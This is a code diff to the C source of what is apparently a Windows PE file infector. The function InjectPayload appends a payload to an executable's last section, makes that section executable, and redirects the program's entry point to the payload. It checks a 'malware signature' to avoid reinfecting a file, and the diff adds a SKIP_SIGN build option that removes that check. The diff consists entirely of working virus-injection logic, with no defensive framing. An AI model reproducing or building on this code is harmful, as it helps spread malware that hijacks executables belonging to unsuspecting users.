@@ -6,12 +6,14 @@
 
 EXTERN_C_START
 extern CONST BYTE __payload_start;
-extern CONST DWORD signature;
 extern CONST VOID payload();
 extern LONGLONG delta_start;
 extern LONGLONG to_c_code;
 extern DWORD code_size;
 extern CONST BYTE __payload_end;
+#ifndef SKIP_SIGN
+extern CONST DWORD signature;
+#endif
 EXTERN_C_END
 
 BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPayload,
@@ -19,8 +21,11 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     PIMAGE_NT_HEADERS64 pNtHeader;
     PIMAGE_SECTION_HEADER pSection, pLastSection;
     WORD wNbSections;
-    DWORD dwFileAlignment, dwSectionAlignment, dwLastSectionPtr, dwLastSectionSize, dwPayloadPtr,
-        dwOrigEntryPoint, dwNewEntryPoint, dwSignature, dwSizeAligned;
+    DWORD dwFileAlignment, dwSectionAlignment, dwLastSectionPtr, dwLastSectionSize,
+        dwLastSectionRva, dwPayloadPtr, dwOrigEntryPoint, dwNewEntryPoint, dwSizeAligned;
+#ifndef SKIP_SIGN
+    DWORD dwSignature;
+#endif
     printf("pDosHeader: %p\n", pDosHeader);
 
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
@@ -46,6 +51,7 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     pLastSection = &pSection[wNbSections - 1];
     dwLastSectionPtr = pLastSection->PointerToRawData;
     dwLastSectionSize = pLastSection->SizeOfRawData;
+    dwLastSectionRva = pLastSection->VirtualAddress;
     dwPayloadPtr = dwLastSectionPtr + dwLastSectionSize;
     dwOrigEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint;
     printf("Entry point: %#010lx\n", dwOrigEntryPoint);
@@ -57,10 +63,11 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     printf("Old size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
     printf("Old size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);
 
-    if (dwOrigEntryPoint >= pLastSection->VirtualAddress &&
-        dwOrigEntryPoint < pLastSection->VirtualAddress + dwLastSectionSize) {
+#ifndef SKIP_SIGN
+    if (dwOrigEntryPoint >= dwLastSectionRva &&
+        dwOrigEntryPoint < dwLastSectionRva + dwLastSectionSize) {
         dwSignature = *(PCDWORD)((PCBYTE)pDosHeader + dwLastSectionPtr +
-                                 (dwOrigEntryPoint - pLastSection->VirtualAddress) -
+                                 (dwOrigEntryPoint - dwLastSectionRva) -
                                  ((PCBYTE)pEntryPoint - (PCBYTE)&signature));
         printf("\nEntry point seems suspicious (inside last section)\n");
         printf("Malware signature: %#010lx\n", dwSignature);
@@ -69,6 +76,7 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
             return FALSE;
         }
     }
+#endif
 
     dwSizeAligned = ALIGN(dwPayloadSize, dwFileAlignment);
     printf("Aligned payload size: %#lx (%lu)\n", dwSizeAligned, dwSizeAligned);
@@ -78,7 +86,7 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
                                                 ? dwSizeAligned
                                                 : pLastSection->SizeOfRawData;
     pNtHeader->OptionalHeader.SizeOfImage =
-        ALIGN(pLastSection->VirtualAddress + pLastSection->Misc.VirtualSize, dwSectionAlignment);
+        ALIGN(dwLastSectionRva + pLastSection->Misc.VirtualSize, dwSectionAlignment);
     pLastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE;
     pLastSection->Characteristics &= ~IMAGE_SCN_MEM_DISCARDABLE;
     printf("New raw size:      %#lx (%lu)\n", pLastSection->SizeOfRawData,
@@ -88,8 +96,8 @@ BOOL InjectPayload(IN CONST PIMAGE_DOS_HEADER pDosHeader, IN CONST PCBYTE pPaylo
     printf("New size of code:  %lu\n", pNtHeader->OptionalHeader.SizeOfCode);
     printf("New size of image: %lu\n", pNtHeader->OptionalHeader.SizeOfImage);
 
-    dwNewEntryPoint = pLastSection->VirtualAddress + dwLastSectionSize +
-                      (LONG)((PCBYTE)pEntryPoint - (PCBYTE)pPayload);
+    dwNewEntryPoint =
+        dwLastSectionRva + dwLastSectionSize + (LONG)((PCBYTE)pEntryPoint - (PCBYTE)pPayload);
     pNtHeader->OptionalHeader.AddressOfEntryPoint = dwNewEntryPoint;
     printf("New entry point: %#010lx\n", dwNewEntryPoint);
 
